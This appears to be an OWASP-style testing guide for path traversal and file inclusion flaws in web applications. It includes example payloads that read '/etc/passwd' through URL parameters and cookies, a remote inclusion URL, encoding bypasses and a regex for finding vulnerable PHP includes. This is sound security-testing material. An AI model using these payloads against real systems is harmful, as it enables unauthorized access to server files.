# OVERVIEW #

$${\color{green}Summary}$$

Web applications often manage files and rely on input validation to secure them. Poor validation can let attackers access or modify files they shouldnâ€™t be able to, or even run unauthorized code.

$${\color{green}Test \space Objectives}$$

- Find where attackers can exploit path traversal vulnerabilities.
- Assess how bypass techniques can extend path traversal.

# HOW TO TEST #

$${\color{green}Black-Box \space Testing}$$

**1.Input Vectors Enumeration:**
- Identify all user inputs, including URL parameters, form fields, file uploads, and cookies.
- Check for file-related parameters and unusual file extensions. Example checks:
  - `http://example.com/getUserProfile.jsp?item=ikki.html`
  - `http://example.com/index.php?file=content`
  - `http://example.com/main.cgi?home=index.htm`
- Examine cookies that might influence file operations:
  - `Cookie: TEMPLATE=flower`
  - `Cookie: PSTYLE=GreenDotRed`

2.Testing Techniques:
- Path Traversal: Test by manipulating paths to access restricted files:
  - `http://example.com/getUserProfile.jsp?
    item=../../../../etc/passwd`
  - `Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd`
- Remote File Inclusion: Test if the application includes files from external sources:
  - `http://example.com/index.php?
    file=http://www.owasp.org/malicioustxt`
- Local and Remote File Access: Test using file protocols and remote paths:
  - `http://example.com/index.php?file=file:///etc/passwd`
  - `http://example.com/index.php?file=http://localhost:8080`
- Encoding Techniques: Try various encodings to bypass filters:
  - URL encoding: `%2e%2e%2f` for `../`
  - Unicode encoding: `..%c0%af` for `../`
- OS-Specific Considerations:
  - Windows: Handles paths flexibly, with some special characters ignored.

$${\color{green}Gray-Box \space Testing}$$

**1.Review Source Code:**
- Search for file inclusion functions and filesystem operations.
  - For PHP: `include()`, `require()`
  - For JSP: `java.io.File()`
  - For ASP: `include file`
- Use code search tools or regex patterns to identify vulnerabilities:
  - PHP: `include|require(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)`

**2.Database and Application Logic:**
- Check if path traversal strings are inserted into the database and used in file inclusion.
- Analyze how the application sanitizes or handles invalid inputs to avoid warnings or errors.
